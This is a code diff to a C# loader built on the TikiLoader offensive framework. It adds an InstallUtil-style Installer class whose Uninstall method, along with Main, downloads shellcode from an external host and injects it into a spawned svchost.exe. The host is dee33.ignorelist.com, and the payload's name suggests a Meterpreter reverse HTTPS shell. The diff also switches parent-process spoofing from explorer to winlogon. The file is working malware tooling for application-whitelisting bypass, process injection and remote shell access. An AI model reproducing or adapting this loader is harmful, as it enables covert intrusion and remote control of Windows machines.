@@ -5,14 +5,20 @@ using System.Runtime.InteropServices;
 using TikiLoader;
 
 [ComVisible(true)]
-public class TikiSpawn
+
+[System.ComponentModel.RunInstaller(true)]
+public class Sample : System.Configuration.Install.Installer
 {
 
-    public static void Main()
+    public override void Uninstall(System.Collections.IDictionary savedState)
     {
-        TikiSpawn.Flame(@"C:\\Windows\\System32\\dwm.exe", @"http://host/payload");
+        Flame(@"C:\Windows\System32\svchost.exe", @"http://dee33.ignorelist.com/mtr_rvrs_https_102.tiki");
     }
-
+        public static void Main()
+    {
+        Flame(@"C:\Windows\System32\svchost.exe", @"http://dee33.ignorelist.com/mtr_rvrs_https_102.tiki");
+    }
+    
     private static byte[] GetShellcode(string url)
     {
         WebClient client = new WebClient();
@@ -43,11 +49,12 @@ public class TikiSpawn
     private static void Flame(string binary, string url)
     {
         byte[] shellcode = GetShellcode(url);
-        int ppid = FindProcessPid("explorer");
+        string ppid_name = "winlogon";
+        int ppid = FindProcessPid(ppid_name);
 
         if (ppid == 0)
         {
-            Console.WriteLine("[x] Couldn't get Explorer PID");
+            Console.WriteLine("[x] Couldn't get PPID: " + ppid_name);
             Environment.Exit(1);
         }
 
